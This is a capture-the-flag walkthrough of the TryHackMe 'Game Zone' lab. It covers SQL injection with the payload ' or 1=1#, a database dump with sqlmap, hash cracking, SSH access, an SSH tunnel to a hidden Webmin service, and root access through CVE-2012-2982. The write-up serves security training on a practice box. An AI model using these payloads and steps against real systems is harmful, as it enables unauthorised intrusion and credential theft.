# [Game Zone](https://tryhackme.com/room/gamezone) #
Description: Usage of SQLMap, password cracking, reverse SSH tunnel, and privilege escalation

## Recon 
Begin with nmap scan: `nmap -sS -A 10.10.237.248`
```
Nmap scan report for 10.10.237.248
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.10 - 3.13 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.13 (92%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   100.11 ms 10.4.0.1
2   ... 3
4   352.87 ms 10.10.237.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.06 seconds
```

As the box description suggests SQL injection, proceed to connect to the website on port 80

![destination landing page](./img/website_landing_page.png)

## Exploitation phase
Attempt to login using default credentials admin:admin did not work\
Successfully logged in with MySQL payload: `' or 1=1#` as username and blank for password\
Greeted with a search feature for game reviews

![game zone portal](./img/game_zone_portal.png)

As searching does not return any parameters at the URL, search should be a POST request\
Fire up Burp suite to intercept the search request and save the request with headers and session in a text file\

![request in burpsuite](./img/burp_suite_intercept_search_request.png)

Run SQLmap on request text file and dump entire database: `sqlmap -r request.txt --dump`\
Apart from the posts table, SQLmap returned the users table below:\
![sqlmap users table(./img/users_table.png)

Run the password hash from SQLmap through hash-identifier tells us of 2 possibilities\
```
  #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

Possible Hashs:
[+] SHA-256
[+] Haval-256
```
A quick search on crackstation.net returns the de-hashed result: videogamer124

![crackstation result](./img/crackstation_result.png)

Gain initial foothold onto the machine by logging in to SSH using the cracked password and username\
Use find command to locate user.txt file location: `find / -type f -name user.txt 2>/dev/null` and cat contents of the flag\

![ssh into machine using credentials](./img/ssh_agent47.png)


## Escalate privileges
Transfer copy of linpeas.sh to the machine via the attacker machine and execute the script\
As suggested by the room instructions, decided to narrow down on port 10000 which is open but seems to be blocked by a firewall as it did not appear in our nmap scan.\

![active tcp ports](./img/game_zone_activeports.png)

Set up a local tunnel from attacker machine using command: `ssh -L 10000:localhost:10000 agent47@10.10.237.248`\
Navigate to localhost:10000 on the local machine to access the webserver\

![webmin login](./img/webmin_login.png)
Use telnet to connect and grab the webserver banner for CMS version\

![webmin banner](./img/webmin_banner.png)

Based on the webserver details, a RCE vulnerability was found for the exact version of the CMS\
CVE-2012-2982
```
searchsploit webmin 1.580
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execu | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Me | linux/webapps/47330.rb
----------------------------------------------------- ---------------------------------
```
After firing up Metasploit and loading up the module, noticed that the options require username and password parameters for the exploit to work\
Fortunately logging in with the credentials from our earlier finding works\
Unable to complete exploit in Metasploit with error stating either Authentication failed or Exploit Failed \[unreachable\]\

### Gaining root
Decided to try manual exploitation instead and found a [python script by JohnHammond](https://github.com/JohnHammond/CVE-2012-2982)
It turns out the script works successfully and finally we are root!

![script.py to output id](./img/scriptpy_id.png)

After that, it's a matter of finding the root.txt file and cat out it's contents.

![root flag](./img/root_flag.png)